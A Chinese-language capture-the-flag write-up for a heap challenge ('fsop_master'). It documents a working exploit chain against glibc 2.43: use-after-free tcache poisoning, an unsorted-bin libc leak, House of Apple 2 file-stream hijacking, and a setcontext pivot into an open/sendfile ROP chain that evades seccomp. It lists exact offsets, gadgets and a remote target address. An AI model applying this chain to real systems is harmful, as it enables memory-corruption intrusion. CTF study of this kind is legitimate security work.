# fsop_master（06-fsop）· 笔记（已打通）

- **结果**：`nex{1Sop_Ma573R_2f60ntat}`（远程 `219.216.64.241:36813`，flag 位于进程 cwd 的 `flag`）
- **取证**：`evidence/step1_run.txt`、`step2_run.txt`（两次独立连接、ASLR 不同、同一 flag）
- **脚本**：`agent_exp.py`（用户提供的原始脚本，来自 `.zcode/workspace/.../exp.py`）+ `exp.py`（适配版：`context.timeout=3`、默认 remote、flag 路径 `flag`）

## 打通的关键（之前卡点的根因）
1. **pwntools 默认 `timeout=None` 在本机会卡死**：加 `context.timeout = 3` 后同一脚本一次跑通。
   之前几次「exit 无回显」很多其实是 recvuntil 卡住/超时，不是 FSOP 没触发。
2. **flag 在 cwd 的 `flag`**（不是 `/flag`）：`open` 失败时链会干净走到 `_exit`、无任何回显，极易误判成 FSOP 失败。
3. **edit 前加 0.03s 间隔**：`read_int()` 一次最多读 31 字节，索引行与 0x108 payload 若被合并会吞字节 → desync。
4. 成功率约 1/3（远程时序）；失败多为 `show()` 读到 `ok\n1.add...`，重试即可，无需改 exploit。

## 用法
```
python exp.py                          # 默认 219.216.64.241:36813，flag 路径 flag
python exp.py remote HOST PORT [path]  # 换端口/路径
```

## 技术栈映射

| 技术 | 本题具体落点 |
|---|---|
| glibc 2.43 tcache | 每 bin **16 项**（不是 7）、`tcache_key` 随机；tcache 首次 free 时懒分配，排在用户 chunk 之后；`add` 固定 `malloc(0x100)`、`delete` 不置空 → UAF |
| unsorted 泄漏 libc | 伪造 `c3->size=0x441` → free 时 idx=(0x440-0x20)/0x10=**66 ≥ 64 bins**，必然跳过 tcache 进 unsorted；`show(3)` 得 fd=`main_arena+0x60`=`libc+0x212AC8`（**与 tcache 容量无关**） |
| House of Apple 2 | `_IO_2_1_stdout_` 写 fake FILE：`_flags=0xfbad0000`、`write_base(0x20)=0x10 < write_ptr(0x28)=0x100`、`_wide_data(0xa0)=W`、`_mode(0xc0)=0`、`vtable(0xd8)=_IO_wfile_jumps`；W+0x18/0x30=0；W+0xe0=fake wide vtable |
| `_IO_wfile_jumps` | `_IO_flush_all` → `_IO_wfile_overflow` → `_IO_wdoallocbuf`（0x91da0；0x91db9 `mov rdx,rdi` 所以 **rdx=fp**）→ `call [wide_vtable+0x68]`（wide vtable 不校验） |
| setcontext+61 | `setcontext+0x3D=0x4bebd`：`mov rsp,[rdx+0xa0]` → rsp = `stdout->_wide_data` = W；随后从 fp 字段恢复 rbx/rbp/r12–r15 与 rdi/rsi/rdx，`ret` 落到 W 上 ROP |
| seccomp ORW | 过滤器只禁 `execve(59)`/`execveat(322)`；ROP：`open("flag")` → `sendfile(1,3,NULL,huge)` → `_exit(0)`（sendfile wrapper 设 r10=rcx、eax=0x28，EOF 自动截断） |

## 目标与漏洞
`219.216.64.241:36813`（附件 `attachments/pwn` + `libc.so.6` 2.43 + `ld-linux`）

- PIE + canary + NX + Full RELRO；seccomp 只禁 execve/execveat。
- 菜单 `1.add 2.del 3.edit 4.show 5.exit`，提示 `idx: `。
- `add`：`pool[idx] = malloc(0x100)`（覆盖旧指针）。
- `delete`：`free(pool[idx])`，不置空 → UAF / double free。
- `edit`：`read(0, pool[idx], 0x108)` 后 `pool[idx][0x108]=0` → off-by-null。
- `show`：`write(1, pool[idx], 0x10)`。
- PLT：free@0x1030、_exit@0x1040、write@0x1050、malloc@0x1090、exit@0x10c0。

## libc 2.43 关键偏移
- `main_arena=0x212a68`；unsorted fd = main_arena+0x60 = **0x212AC8**
- `_IO_2_1_stdout_=0x213580`；`_IO_wfile_jumps=0x211228`；`_IO_list_all=0x213480`
- `setcontext=0x4be80`，`setcontext+0x3D=0x4bebd`
- open 0x127990、read 0x128150、write 0x128c10、exit 0xf7180、sendfile 0x128200
- `pop rdi;ret 0x11b9fa`、`pop rsi;ret 0x5c067`、`pop rdx;ret 0x8e3e`、`pop rbp;ret 0x28a8d`、
  `pop r13;pop rbp 0x28a8b`、`pop r12..r14 0x11ccb6`、`mov eax,ecx;mov rdx,r8 0xb7603`

## 完整链路
1. 9×add；`dele(0); dele(1)`；`show(0)` → heap_base = fd<<12（`c_i = heap+0x10+0x110*i`）
2. `edit(1, mangle(c1, c3-0x10))` → `add(9)`=c1、`add(10)`=c3-0x10
3. `edit(10, p64(0)+p64(0x441))` 伪造 c3->size；`dele(3)` → unsorted
4. `show(3)` → libc_base = fd-0x212AC8
5. `dele(2); dele(4)`；`edit(4, mangle(c4, stdout))` → `add(11)`=W=c4、`add(12)`=stdout
6. `edit(9, V+0x68=setcontext+0x3D)`；`edit(2, path="flag")`；`edit(11, ROP@W)`；`edit(12, fake FILE@stdout)`
7. 菜单选 5 → `exit(0)` → `_IO_cleanup` → `_IO_flush_all` → `_IO_wfile_overflow` → `_IO_wdoallocbuf`
   → `call [wide_vtable+0x68]`（rdx=fp）→ `setcontext+0x3D`（rsp=W）→ ROP → `sendfile` 回显 flag

## 踩坑清单
- pwntools 超时（已解决：`context.timeout=3`）
- flag 路径（cwd `flag` vs `/flag`）
- edit 时序（read_int 吞 payload）
- 2.43 tcache 懒分配 / 16 项 → 经典「塞满 7 个进 unsorted」失效，改用 0x440 路由
- 本机无法本地调（WSL 被沙箱禁、无 Docker/qemu），只能静态 + 远程重试
